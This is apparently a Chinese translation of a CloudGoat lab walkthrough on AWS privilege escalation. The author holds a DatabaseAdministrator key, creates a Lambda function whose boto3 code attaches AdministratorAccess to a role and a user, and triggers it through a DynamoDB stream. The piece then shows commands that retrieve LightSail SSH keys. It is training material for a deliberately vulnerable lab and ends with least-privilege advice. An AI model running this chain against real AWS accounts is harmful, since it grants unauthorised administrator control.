> 原文链接: https://www.anquanke.com//post/id/170849 


# CloudGoat云靶机 Part-3：利用AWS Lambda函数提权


                                阅读量   
                                **156797**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者rzepsky，文章来源：medium.com
                                <br>原文地址：[https://medium.com/@rzepsky/playing-with-cloudgoat-part-3-using-aws-lambda-for-privilege-escalation-and-exploring-a-lightsail-4a48688335fa](https://medium.com/@rzepsky/playing-with-cloudgoat-part-3-using-aws-lambda-for-privilege-escalation-and-exploring-a-lightsail-4a48688335fa)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p0.ssl.qhimg.com/dm/1024_575_/t01e57150d9f8db6936.jpg)](https://p0.ssl.qhimg.com/dm/1024_575_/t01e57150d9f8db6936.jpg)





## 前言

本文将描绘当攻击者拥有用户Joe和Bob的访问密钥，但EC2实例停止服务的情形。如果你是第一次阅读本系列文章，你不知道什么是**CloudGoat**以及Joe和Bob到底是谁，那么我建议你先阅读本系列的[第一部分](https://www.anquanke.com/post/id/170516)。



## 权限提权

拥有访问密钥后，攻击者首先会检验该账户拥有的权限。在这里，Joe缺少`iam:ListAttachedUserPolicies`和`iam：GetUserPolicy`权限（列出某用户拥有的权限），但幸运的是我们可以使用Bob。

[![](https://p2.ssl.qhimg.com/t0119d50c459c5916c1.png)](https://p2.ssl.qhimg.com/t0119d50c459c5916c1.png)

Oooh，可以看到Joe的权限为[`DatabaseAdministrator`](https://console.aws.amazon.com/iam/home#policies/arn:aws:iam::aws:policy/job-function/DatabaseAdministrator)。如果允许我们用该权限创建一个Lambda函数的话，一切将变得简单起来。首先我得了解Joe拥有哪些角色（没有角色，即使创建了新**Lambda**函数，也无法执行任何操作），让我们使用以下命令看看分配了哪些角色：

```
$ aws iam list-roles --profile joe
```

从输出中，我们可以读到这里实际上有2个角色与**Lambda**函数有关：`iam_for_lambda`和`lambda-dynamodb-cloudgoat`。第一个名为`policy_for_lambda_role`的策略，它有助于我们绕过**CloudTrail**的监控服务（有关详细信息，请参阅本系列的第二部分）。现在，让我们来看看第二个角色——`lambda-dynamodb-cloudgoat`

[![](https://p2.ssl.qhimg.com/t011ecf686e07a98d41.png)](https://p2.ssl.qhimg.com/t011ecf686e07a98d41.png)

好的！可以看到它拥有`iam:AttachRolePolicy`权限，我可以使用Lambda服务将权限升级为管理员权限😎，如此“邪恶”功能似乎很容易实现：

```
import boto3

def lambda_handler(event, context):
    iam = boto3.client("iam")
    iam.attach_role_policy(RoleName="lambda-dynamodb-cloudgoat", 
        PolicyArn="arn:aws:iam::aws:policy/AdministratorAccess",)
    iam.attach_user_policy(UserName="joe", 
        PolicyArn="arn:aws:iam::aws:policy/AdministratorAccess",)
```

`DatabaseAdministrator`策略允许创建新的Lambda函数。现在，是时候压缩代码，创建一个新的Lambda函数了：

[![](https://p3.ssl.qhimg.com/t016b39baa5a86e9f55.png)](https://p3.ssl.qhimg.com/t016b39baa5a86e9f55.png)

最后的一步本该是简单地调用函数，然后庆祝提权成功。但遗憾的是……并不允许直接调用😢

[![](https://p1.ssl.qhimg.com/t014a4c963cb9895485.gif)](https://p1.ssl.qhimg.com/t014a4c963cb9895485.gif)

办法总有很多，这里我们可以使用事件`*`来调用Lambda

> `*` ——这里插入一点题外话，因为这是适用于所有**Serverless**应用的全新攻击向量：**事件注入**。一般来说，**Lambda**函数是用来处理事件，所以如果可以使事件“丢帧”（例如上传的S3对象的名称）并且后续未正确验证，那么就可以强制**Lambda**执行我们的代码。我现在不想详细介绍，因为这不适用于**CloudGoat**场景，但是如果你是这种类型的攻击的新手，我建议你先观看一个[简短的视频展示](https://www.youtube.com/watch?v=M7wUanfWs1c)，看看这个简单的例子[上传文件名中的SQLi](https://www.jeremydaly.com/event-injection-protecting-your-serverless-applications/)或这个[更”真实“的例子](https://www.youtube.com/watch?v=TcN7wHuroVw)。

[![](https://p4.ssl.qhimg.com/t0182b3596edbe9dd0c.png)](https://p4.ssl.qhimg.com/t0182b3596edbe9dd0c.png)

现在，我们回到本文的场景。[这里](https://docs.aws.amazon.com/zh_cn/lambda/latest/dg/invoking-lambda-function.html)有Lambda支持的事件源列表。这里，我们选取`Amazon DynamoDB`事件。查看[用户Joe权限](https://console.aws.amazon.com/iam/home?#/policies/arn:aws:iam::aws:policy/job-function/DatabaseAdministrator%24serviceLevelSummary)，允许将新的Lambda函数与`DynamoDB`表连接起来 – 换句话说，我可以配置一个新的Lambda函数，在`DynamoDB`表中创建新条目，就可以实现调用该函数。这可能听起来很奇怪，请看下面这个例子。让我们尝试使用以下命令创建一个名为`rzepsky_table`的表来简单地测试：

```
$ aws dynamodb create-table --table-name rzepsky_table --attribute-definitions AttributeName=Test,AttributeType=S --key-schema AttributeName=Test,KeyType=HASH --provisioned-throughput ReadCapacityUnits=3,WriteCapacityUnits=3 --stream-specification StreamEnabled=true,StreamViewType=NEW_IMAGE --query TableDescription.LatestStreamArn --profile joe
```

简单解释一下，上述命令创建了一个只有一列`Test`用于存储字符串（`S`）的新表。在`--key-schema`中，我给`Test`指定了主键。然后，我使用了参数`provisioned-throughput`和启用了`DynamoDB Stream`流。

好的，它的确起作用了🤓

[![](https://p4.ssl.qhimg.com/t010018b786c955a139.png)](https://p4.ssl.qhimg.com/t010018b786c955a139.png)

[![](https://p0.ssl.qhimg.com/t01fae2358bf7f7e209.png)](https://p0.ssl.qhimg.com/t01fae2358bf7f7e209.png)

只要我创建一个事件源，就可以将新的`DynamoDB`表与之前创建的Lambda函数链接起来：

[![](https://p1.ssl.qhimg.com/t01ca44ca939a22e624.png)](https://p1.ssl.qhimg.com/t01ca44ca939a22e624.png)

Emm…这也有效！最后，我们只需在表中添加一个新条目就可以触发Lambda函数了。使用以下命令：

```
$ aws dynamodb put-item --table-name rzepsky_table --item Test='`{`S=”Rzepsky”`}`' --profile joe
```

如果一切顺利，这个事件会调用Lambda函数，并且将管理员权限策略附加给用户Joe。现在，让我们验证一下Joe的权限：

[![](https://p0.ssl.qhimg.com/t01cddcad16feeab69e.png)](https://p0.ssl.qhimg.com/t01cddcad16feeab69e.png)

非常棒！我们提权成功了。

[![](https://p1.ssl.qhimg.com/t01516e390f6bfc8619.gif)](https://p1.ssl.qhimg.com/t01516e390f6bfc8619.gif)



## 初窥 AWS LightSail

**LightSail**服务为云用户提供云计算，存储和网络。换句话说，您可以快速获得各种操作系统，应用程序和堆栈，以便您可以构建模板。LightSail的目标是为用户提供EC2的简化版本，因此你无需了解EBS，VPC和Route 53的使用细节 – 你只需要获得一个简单，轻量级的VPS。便捷通常伴随着风险，LightSail的简单性会降低安全性吗？让我们开始探究LightSail。

在EC2实例中，不允许直接下载SSH密钥来获取实例的shell。但是，在LightSail中，情况有所不同。首先，LightSail的用户允许使用“默认密钥”，可以使用以下命令检索：

```
$ aws lightsail download-default-key-pair
```

让我们看看**CloudGoat**靶机中的LightSail项目的密钥信息：

```
$ aws lightsail get-instance-access-details --instance-name cloudgoat_ls --profile joe
```

我们简单地获得临时ssh密钥，这在LightSail中这不是什么问题。从输出中我们可以读到LightSail实例使用的是`cloudgoat_key_pair`：

[![](https://p4.ssl.qhimg.com/t011971ee6a01e33b69.png)](https://p4.ssl.qhimg.com/t011971ee6a01e33b69.png)

重要的一点，如果我们拥有AWS控制台管理访问权限（比如我将joe的权限升级为管理员，这是可能的），那么可以直接从浏览器访问shell！只需点击终端的小图标：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t010c99cf73c1d8455a.png)



## 结束语

在本文，我们介绍了使用Amazon提供的`DatabaseAdministrator`策略，结合具有Lambda宽权限的角色，实现权限提升的过程。管理**IAM**权限并非易事，特别是如果你具有复杂的体系结构和众多的用户。一个有效的工具可以帮助你实现权限最小化分配——[Netflix Repokid](https://github.com/Netflix/repokid)。

后面我们将继续探讨了**LightSail**服务的一些”**features**“。不要误解我的意思 ，我不是认为它不安全，我们要做的是恰当地控制连接权限。在权限策略中分配通配符时，请注意这些“**features**”😉

在下一篇文章中，我将介绍另一个**CloudGoat**的场景，感谢观看。
